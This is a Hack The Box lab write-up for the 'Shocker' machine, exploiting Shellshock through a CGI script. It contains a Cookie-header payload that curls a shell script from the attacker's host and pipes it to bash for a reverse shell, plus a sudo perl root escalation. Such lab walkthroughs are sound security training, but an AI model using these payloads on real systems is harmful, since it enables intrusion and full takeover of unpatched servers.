# HTB Machine Shocker Write Up

## Overall about ShellShock

ShellShock is a vulnerability that affects the Bash shell, which is a command-line interface that is commonly used in Unix-based operating systems. The vulnerability allows attackers to run commands remotely on an affected system without authentication. This makes it possible for attackers to gain control of the system and execute malicious code. Additionally, the vulnerability can be exploited to gain access to sensitive information stored on the system. As such, it is important to patch systems with the latest security updates to prevent exploitation.

1. **Reconnaissance**
    
    From the description, we only be provided with the IP of the machine. Which is 10.10.10.56, we want to gather everything that is available from this machine.
    
    1. **Discover**
        
        ![Untitled](HTB%20Machine%20Shocker%20Write%20Up%20d31d5035fddb4b13ad599f73b1a584aa/Untitled.png)
        
        We discovered port 80 and 2222 is opened from the machine IP 10.10.10.56.
        
        ![Browse for the site](HTB%20Machine%20Shocker%20Write%20Up%20d31d5035fddb4b13ad599f73b1a584aa/Untitled%201.png)
        
        Browse for the site
        
    2. **Enumeration**
        
        From this step, we already known that the machine is running a web service on port 80 and nothing else. We want to search for folders or endpoints that were opened within the web server.
        
        Using dirbuster built-in Kali, with below setting we can generate the following report that contains folders and endpoints that is available which is response in 200 from the machine on port 80.
        
        ![Untitled](HTB%20Machine%20Shocker%20Write%20Up%20d31d5035fddb4b13ad599f73b1a584aa/Untitled%202.png)
        
        ![Untitled](HTB%20Machine%20Shocker%20Write%20Up%20d31d5035fddb4b13ad599f73b1a584aa/Untitled%203.png)
        
        ![Access to the endpoint](HTB%20Machine%20Shocker%20Write%20Up%20d31d5035fddb4b13ad599f73b1a584aa/Untitled%204.png)
        
        Access to the endpoint
        
        From this report, we may want to search for the vulnerability that related to cgi-bin folder, which is the folder contains script that can communicate directly with Bash to perform tasks that expose to the out side world. 
        
        Through research, it leaded me to the following [link](https://nvd.nist.gov/vuln/detail/CVE-2014-6271#match-7146748) which mention about the vulnerable dubbed Shellshock, which take CGI as a vector to exploit.
        
        We can also use nmap with script to scan for the vulnerable:
        
        ```bash
        nmap -sV -T5 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56
        ```
        
        ![Untitled](HTB%20Machine%20Shocker%20Write%20Up%20d31d5035fddb4b13ad599f73b1a584aa/Untitled%205.png)
        
2. Step to reproduce
    1. Shellshock
        
        From BurpSuite, we want to capture a packet from proxy and move it to repeater. From repeater, we noticed that this user.sh file is running some kind of time checking which we already known that file stored in cgi-bin folder will communicate directly to Bash.
        
        ![Untitled](Vulnerability%20Report%20on%20Shell%20Shock%20Vulnerability%207d0e82428fdd4b57bf5df01dcf67adf0/Untitled.png)
        
        ```bash
        env x='() { :;}; echo vulnerable' bash -c "echo test"
        ```
        
        From the PoC, due to the misunderstanding of handling the character, which is the main cause of the vulnerable, attacker can directly force bash to run command without authentication right from web access while abusing http headers in shell script that expose to the WWW in cgi-bin folder.
        
        ![Untitled](Vulnerability%20Report%20on%20Shell%20Shock%20Vulnerability%207d0e82428fdd4b57bf5df01dcf67adf0/Untitled%201.png)
        
    2. Reverse shell and netcat 
        
        We want to test for our theory, we can try some variant of the PoC like abusing Cookie header:
        
        ![Untitled](Vulnerability%20Report%20on%20Shell%20Shock%20Vulnerability%207d0e82428fdd4b57bf5df01dcf67adf0/Untitled%202.png)
        
        From that, we can sure that our theory is right and we already go for 50% of the road, we want to make a connection back from the machine to take the full control.
        
        ```bash
        Cookie: () { exp;}; echo; /usr/bin/curl 10.10.14.15/shell.sh | /bin/bash
        ```
        
        ![Untitled](Vulnerability%20Report%20on%20Shell%20Shock%20Vulnerability%207d0e82428fdd4b57bf5df01dcf67adf0/Untitled%203.png)
        
        Using [payloadallthething](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-udp) to take the sample reverse shell, use python httpserver to quickly host a server and use netcat as a listener on port 4444 set above within the shell.sh, we can make a connection back from the machine as user **shelly.**
        
    3. Privilege Escalation  - Post exploit
        
        From here, we can read user.txt flag which stored in /home folder. However, we want to take a full control over the machine, which is the root privilege.
        
        We may want to take a look at sudo with option list which contains users’ privileges or commands that the user can run.
        
        ![Untitled](Vulnerability%20Report%20on%20Shell%20Shock%20Vulnerability%207d0e82428fdd4b57bf5df01dcf67adf0/Untitled%204.png)
        
        > If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
        > 
        
        ```bash
        sudo perl -e 'exec "/bin/sh";'
        ```
        
        And with the help of [gtfobins](https://gtfobins.github.io/gtfobins/perl/), we can successful escalate to the root privilege and read the root flag in /root folder.
        
        ![Untitled](Vulnerability%20Report%20on%20Shell%20Shock%20Vulnerability%207d0e82428fdd4b57bf5df01dcf67adf0/Untitled%205.png)